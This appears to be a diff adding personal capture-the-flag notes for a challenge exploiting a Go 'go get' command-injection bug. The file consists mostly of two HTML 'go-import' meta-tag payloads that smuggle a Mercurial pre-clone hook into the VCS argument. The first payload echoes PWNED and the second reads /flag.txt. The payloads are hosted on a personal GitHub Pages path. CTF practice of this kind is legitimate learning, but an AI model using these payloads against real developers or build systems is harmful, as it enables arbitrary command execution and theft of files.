@@ -1,0 +1,11 @@
+CTF link: http://95.217.6.37:20002/submit
+idea: vuln go version 
+resource: https://github.com/golang/go/issues/23867
+
+put paloud in pkg/index.html
+
+1-test payloud : <meta name="go-import" content="mohammed-etman.github.io/pwn/pkg hg --config=hooks.pre-clone=echo${IFS}PWNED;echo${IFS}https://>/dev/null">
+      #this will prof by prind PWNED
+2-Last payloud: <meta name="go-import" content="mohammed-etman.github.io/pwn/pkg hg --config=hooks.pre-clone=cat${IFS}/flag.txt;echo${IFS}https://>/dev/null">
+
+Add this: mohammed-etman.github.io/pwn/pkg 
